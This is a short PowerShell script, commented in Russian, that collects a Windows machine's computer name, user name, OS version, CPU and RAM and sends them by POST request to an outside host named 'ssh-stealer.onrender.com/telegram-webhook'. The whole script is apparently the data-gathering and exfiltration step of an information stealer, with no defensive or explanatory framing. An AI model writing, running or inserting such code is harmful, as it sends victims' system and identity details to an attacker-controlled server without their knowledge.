# Собираем информацию о ПК
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
$processor = (Get-CimInstance Win32_Processor).Name
$ramGB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)

# Формируем текст сообщения
$message = @"
PC Info:
- Computer Name: $computerName
- User Name: $userName
- OS: $osVersion
- CPU: $processor
- RAM: $ramGB GB
"@

# Формируем тело запроса JSON
$body = @{
    content = $message
    embeds = @()
} | ConvertTo-Json -Depth 3

# Заголовки
$headers = @{ "Content-Type" = "application/json" }

# Отправляем POST-запрос
Invoke-RestMethod -Uri "https://ssh-stealer.onrender.com/telegram-webhook" -Method POST -Headers $headers -Body $body
